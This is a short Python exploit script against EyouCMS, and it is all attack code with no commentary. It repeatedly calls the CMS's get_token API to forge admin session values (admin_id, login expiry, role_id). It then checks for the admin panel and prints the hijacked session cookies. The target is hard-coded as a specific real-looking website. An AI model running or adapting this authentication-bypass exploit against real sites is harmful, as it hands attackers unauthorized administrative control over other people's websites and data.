import requests
from time import time
import sys


headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest'
}
def change(string):
        temp = ''
        for n, s in enumerate(string):
            if n == 0:
                if s.isalpha():
                    return '0'
                    break
            if s.isdigit():
                temp += str(s)
            else:
                if s.isalpha():
                    break
        return temp
def eyouCMS(target,sessions,num):
    sessions.get(target+"/index.php/?m=api&c=ajax&a=get_token&name=admin_id",headers=headers)
    res_expire=sessions.get(target +"/index.php/?m=api&c=ajax&a=get_token&name=admin_login_expire",headers=headers)
    if(time()-int(change(res_expire.text),10)<3600):
        res_role_id=sessions.get(target +"/index.php/?m=api&c=ajax&a=get_token&name=admin_info.role_id",headers=headers)
        if(int(change(res_role_id.text),10)<=0):
            res_login = sessions.get(target +"/login.php",allow_redirects=False)    
            if '栏目管理' in res_login.text:        
                print(f'{sessions.cookies.get_dict()}  yes')
                return True
            else:
                print(f'{sessions.cookies.get_dict()}  no')
    else:
        
        print(f'[{num}]  {res_expire.text}')

    
    
if __name__ == '__main__':
    target='http://qyd.qjcm5599.com'
    #print("-"*10 + "=<V9.1" + "-"*10)
    #VersionURL = target + '/index.php/base?a=Version'
    #res_version = requests.get(VersionURL)
    #print("-"*11 + res_version.text + "-"*11)   
    num=0
    while True:
        num+=1
        sessions = requests.session()
        if eyouCMS(target,sessions,num):
            break
